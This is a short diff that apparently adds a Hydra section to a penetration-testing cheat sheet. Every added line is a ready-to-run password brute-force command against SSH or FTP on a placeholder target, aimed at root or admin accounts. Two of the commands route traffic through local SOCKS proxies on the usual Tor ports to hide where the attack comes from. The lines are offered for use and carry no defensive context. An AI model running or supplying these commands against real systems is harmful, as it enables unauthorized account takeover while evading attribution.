@@ -132,3 +132,8 @@
         i=$(($i+1))
     done
 
+##### &#x1F538; Hydra
+    hydra -t 64 -l root -V -x '4:4:aA1"@#$!()=`~?><;:%^&*_-+/,.\ ' ssh TARGET
+    hydra -t 4 -l root -V -x '4:9:a-z' TARGET ssh HYDRA_PROXY=socks5://127.0.0.1:9150
+    hydra -l admin -p /opt/backbox/warlist/password-ftp.txt ftp://TARGET HYDRA_PROXY=socks5://127.0.0.1:9050
+    
